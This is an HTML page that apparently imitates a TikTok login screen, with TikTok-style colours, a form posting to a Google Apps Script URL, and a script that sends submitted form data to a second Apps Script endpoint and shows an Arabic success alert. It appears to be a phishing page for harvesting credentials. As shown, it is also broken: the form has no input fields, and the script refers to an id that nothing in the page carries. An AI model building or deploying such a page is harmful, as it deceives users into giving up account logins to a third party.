hi<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login - TikTok</title>
  <style>
    body {
      background-color: #000;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: #111;
      padding: 2rem;
      border-radius: 10px;
      width: 300px;
      box-shadow: 0 0 10px #ff0050;
    }
    .login-box h2 {
      margin-bottom: 1rem;
      color: #ff0050;
      text-align: center;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      outline: none;
    }
    button {
      background-color: #ff0050;
      color: white;
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #e60045;
    }
  </style>
</head>
<body>
  <form class="login-box" action="https://script.google.com/macros/s/AKfycbzcoa2RER7_GmiQM5gWYsjjI2RKKfhwFcca3k5yL2kidpWfaLt3SO1t59kBD1JNPnFHVw/exec" method="POST">
  </form>

  <script>
    const form = document.getElementById("login-form");
    form.addEventListener("submit", function(e) {
      e.preventDefault();
      const data = new FormData(form);
      fetch("https://script.google.com/macros/s/AKfycbwA9rGTrW8T50SWPMzGfSKISErvaQ4k_lS6tLFJciagqRgVxjPniOr0KIFq8W4k9wmEwg/exec", {
        method: "POST",
        body: data
      })
      .then(response => alert("✅ تم الإرسال بنجاح!"))
      .catch(error => alert("❌ فشل الإرسال: " + error));
    });
  </script>
</body>
</html>
